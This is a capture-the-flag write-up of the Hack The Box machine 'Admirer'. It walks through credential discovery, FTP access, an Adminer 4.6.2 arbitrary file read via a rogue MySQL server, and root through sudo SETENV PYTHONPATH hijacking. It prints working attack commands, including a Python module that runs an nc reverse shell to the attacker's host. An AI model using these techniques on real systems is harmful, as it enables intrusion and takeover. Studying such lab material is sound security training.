# Admirer
```
Difficulty: Easy
Operating System: Linux
Hints: True
```
## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
# Nmap 7.92 scan initiated Fri Apr  8 16:07:24 2022 as: nmap -sC -sV -oA /root/Documents/HTB/Boxes/Admirer/nmap/initial-tcp 10.10.10.187
Nmap scan report for 10.10.10.187
Host is up (0.038s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-title: Admirer
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr  8 16:07:37 2022 -- 1 IP address (1 host up) scanned in 13.37 seconds
```
By quickly searching on searchsploit we can see that we have available exploits only for vsftpd 2.x, so, let's dig deeper into port 80.  
Running default scripts in our ```init-target``` procedure we can see that our quick nmap --vuln scan pops up the following:
```
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
```
if we go to port http://10.10.10.187/robots.txt we can see the following content:  
```
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```
so let's dig into this directory and run some directory enumeration.  
Before enumerating directories, since the robots.txt file is referring to personal contacts and creds, let's use gobuster with raft-large-files.txt wordlist to enumerate files within this folder:  
```
/credentials.txt      (Status: 200) [Size: 136]
/contacts.txt         (Status: 200) [Size: 350]
/.htaccess            (Status: 403) [Size: 277]
/.                    (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htm                 (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
/.htgroup             (Status: 403) [Size: 277]
/wp-forum.phps        (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htuser              (Status: 403) [Size: 277]
/.ht                  (Status: 403) [Size: 277]
/.htc                 (Status: 403) [Size: 277]
/.htaccess.old        (Status: 403) [Size: 277]
/.htacess             (Status: 403) [Size: 277]
```
we can find a credentials.txt file and a contacts.txt file. Credentials.txt contains credentials to varius services:  
```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```
since we initially discovered an ftp service, let's try this credentials against this service and see if we can login:  
```
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
now we can scan the ftp chroot directory and download all the files for further offline analysis.  
```
ftp> get dump.sql
local: dump.sql remote: dump.sql
229 Entering Extended Passive Mode (|||7567|)
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
100% |************************************************************************************************************************************************************************************************|  3405      913.51 KiB/s    00:00 ETA
226 Transfer complete.
3405 bytes received in 00:00 (83.33 KiB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
229 Entering Extended Passive Mode (|||33959|)
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
100% |************************************************************************************************************************************************************************************************|  5147 KiB    1.42 MiB/s    00:00 ETA
226 Transfer complete.
5270987 bytes received in 00:03 (1.40 MiB/s)
ftp> ^D
221 Goodbye.
```
if we open the index.php file in html.tar.gz file we can see the following creds:  
```
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
```
unfortunately these credentials does not lead to anywhere, so let's keep enumerating.
Inside the  utility-scripts folder, into db_admin.php file, we can see other credentials.  
```
$username = "waldo";
$password = "Wh3r3_1s_w4ld0?";
```
Unfortunately this credentials does not leads to anywhere as well.  
Since we do not found anything, let's keep enumerating for other services where this creds may be valid.  
Now, if we keep enumerating directories we can find into the utility-script dir the following files:
```
/info.php             (Status: 200) [Size: 83770]
/phptest.php          (Status: 200) [Size: 32]
/adminer.php          (Status: 200) [Size: 4296]
```
So, now, lets dig into ```http://10.10.10.187/utility-scripts/adminer.php```.

## User
As we open the ```http://10.10.10.187/utility-scripts/adminer.php``` we can see that this site is running admirer 4.6.2.  Poking around on internet we can see that this version is vulnerable to Improper access control and allows an attacker to to achieve Arbitrary File Read on the server by connecting a remote MySQL database to the Adminer.  
Now, according to [this article](https://podalirius.net/en/articles/writing-an-exploit-for-adminer-4.6.2-arbitrary-file-read-vulnerability/) we can set up a database on our localhost, create user with grants and achieve arbitrary file read.
```                                                                                               
MariaDB [(none)]> CREATE DATABASE deleteme;                                                                        
Query OK, 1 row affected (0.000 sec)
MariaDB [(none)]> use deleteme                                                                                     
Database changed                                                                                                                                                              
MariaDB [deleteme]> create table exf (a TEXT(4096));                                                                                                           
Query OK, 0 rows affected (0.007 sec)                            
MariaDB [deleteme]> show tables;                                                                                                           
+--------------------+                                                                                             
| Tables_in_deleteme |                                                                                             
+--------------------+                                                                                             
| exf                |                                                                                             
+--------------------+                                                                                             
1 row in set (0.001 sec)
MariaDB [(none)]> CREATE USER 'b0d'@'localhost' IDENTIFIED BY 'password';
Query OK, 0 rows affected (0.001 sec)
MariaDB [(none)]> GRANT ALL PRIVILEGES ON deleteme.* TO 'b0d'@'localhost';
Query OK, 0 rows affected (0.001 sec)
```
Now we set up the database, however, as we know, MySQL by defaut listens on port 3306 of localhost.  
If we want to make it publicly available we can either edit ```/etc/mysql/mariadb.conf.d/50-server.cnf``` or setup a socat tunnel using the following command:  
```
socat TCP-LISTEN:3306,fork,bind=10.10.14.24 TCP:127.0.0.1:3306
```
Now we can provide all the defined credentials to admirer.php and log in into the service.  
Once we are in, always according to [this article](https://podalirius.net/en/articles/writing-an-exploit-for-adminer-4.6.2-arbitrary-file-read-vulnerability/) we can perform the following query to read local files:  
```
LOAD DATA local INFILE '/etc/passwd' INTO TABLE exf fields TERMINATED BY "\n";
```
As output we receive:  
```
Error in query (2000): open_basedir restriction in effect. Unable to open file
```
if we go to info.php file, we can see that the following restriction is in place.  
```
open_basedir	/var/www/html	/var/www/html
```
So we can try to read a file within this path and see if we can find some creds. Let's start by index.php
```
LOAD DATA local INFILE '/var/www/html/index.php' INTO TABLE exf fields TERMINATED BY "\n";
```
the query succeed, now we can see the data loaded into the database, here we find one password which is different from the ones disclosed earlier:  
```
$servername = "localhost";
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
$dbname = "admirerdb";
```
Now we can try to use this creds against SSH:  
```
[root@kali Admirer ]$ ssh -l waldo $TARGET                                          
The authenticity of host '10.10.10.187 (10.10.10.187)' can't be established.
ED25519 key fingerprint is SHA256:MfZJmYPldPPosZMdqhpjGPkT2fGNUn2vrEielbbFz/I.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.187' (ED25519) to the list of known hosts.
waldo@10.10.10.187's password:
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
waldo@admirer:~$
```
and we gain a shell as user waldo.

## Root
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, a part from one not working exploit, we cannot see anything intresting.  
As we know, linpeas does not have password for ```sudo -l``` but we do, so let's run sudo -l and provide the discovered password:  
```
waldo@admirer:~$ sudo -l
[sudo] password for waldo:
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```
So, if we look carefully we can notice that sudo comes with the SETENV option enabled, this, according to documentation, will permit us to export our environment variables when running commands as root.  
if we open the admin_tasks.sh script, we can notice that it contains various options. Each option allows user to execute command, in all the options, we have absoulute path in when executing command, but as we can notice, in option 6, the scripts calls ```/opt/scripts/backup.py``` that is a file on which we have writing permissions.  
The file basically contains the following:  
```
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'
# old ftp directory, not used anymore
#dst = '/srv/ftp/html'
dst = '/var/backups/html'
make_archive(dst, 'gztar', src)
```
As we can see it imports a library.  
Googling around we can see that using the variable ```PYTHONPATH```, we can set a custom directory for python libraries, hence, we can craft the following script under ```/dev/shm/shutil.py``` containing the following:
```
#!/usr/bin/python3
import socket,subprocess,os

def make_archive(a, b, src):
  os.system("nc -e /bin/sh 10.10.14.24 9001")
```
Now, all we need to do is set up a listener on port 9001 and execute ```/opt/scripts/admin_tasks.sh``` script:  
```
waldo@admirer:/dev/shm$ sudo PYTHONPATH="/dev/shm" /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
waldo@admirer:/dev/shm$ less /opt/scripts/admin_tasks.sh
```
and we gain a reverse shell as root:  
```
root@kali:~/Documents/HTB/Boxes/Admirer# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.187] 44392
id                     
uid=0(root) gid=0(root) groups=0(root)
```


#### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap Scan, Website Enumeration | Identified open ports 21 (FTP), 22 (SSH), and 80 (HTTP). Found a `robots.txt` file with a disallowed directory `/admin-dir`. |
| 2 | (Web) | Directory Enumeration | Used `gobuster` to find `credentials.txt` and `contacts.txt` within the `/admin-dir` directory. |
| 3 | ftpuser | FTP Credential Usage | Found FTP credentials in `credentials.txt` and logged in to the FTP service. |
| 4 | (Web) | FTP File Download & Code Review | Downloaded `html.tar.gz` and `dump.sql`. Reviewed the PHP files from the archive, discovering a new set of credentials for the `waldo` user. |
| 5 | (Web) | Adminer Vulnerability (Arbitrary File Read) | Discovered a vulnerable Adminer version on `/utility-scripts/adminer.php`. Set up a remote MySQL database and used the `LOAD DATA LOCAL INFILE` query to read files on the target server. |
| 6 | waldo | Password Reuse & SSH Login | Read `/var/www/html/index.php` to find another set of credentials. Used these credentials to log in via SSH as the `waldo` user. |
| 7 | waldo | `sudo` & SUID Enumeration | Ran `sudo -l` and found that `waldo` could execute the `/opt/scripts/admin_tasks.sh` script with `SETENV` privileges. |
| 8 | waldo | `PYTHONPATH` Hijacking | The `admin_tasks.sh` script called `/opt/scripts/backup.py`. We exploited the `SETENV` option to set a malicious `PYTHONPATH` pointing to a custom `shutil.py` script. |
| 9 | root | Reverse Shell | Our custom `shutil.py` script contained a reverse shell payload. Executing `admin_tasks.sh` with the crafted `PYTHONPATH` gave us a shell as the `root` user. |